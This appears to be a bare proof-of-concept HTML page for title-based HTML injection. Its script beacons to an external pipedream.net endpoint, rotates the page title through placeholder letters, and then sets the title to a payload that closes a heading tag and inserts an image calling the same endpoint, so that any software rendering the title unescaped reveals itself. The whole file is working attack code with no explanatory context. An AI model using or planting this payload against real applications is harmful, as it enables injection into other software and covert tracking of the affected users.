<!DOCTYPE html>
<html>
<body>
    <script>
        (new Image()).src = "https://eou0c9qohvcityk.m.pipedream.net?stage=1";

        let count = 0;
        const benignTitles = ["A", "B", "C", "D", "E", "F"];
        
        const payload = `</h1><img src="https://eou0c9qohvcityk.m.pipedream.net?stage=2"><h1>`;

        const interval = setInterval(() => {
            if (count < benignTitles.length) {
                document.title = benignTitles[count];
            } else {
                document.title = payload;
                clearInterval(interval);
            }
            count++;
        }, 1000);
    </script>
</body>
</html>
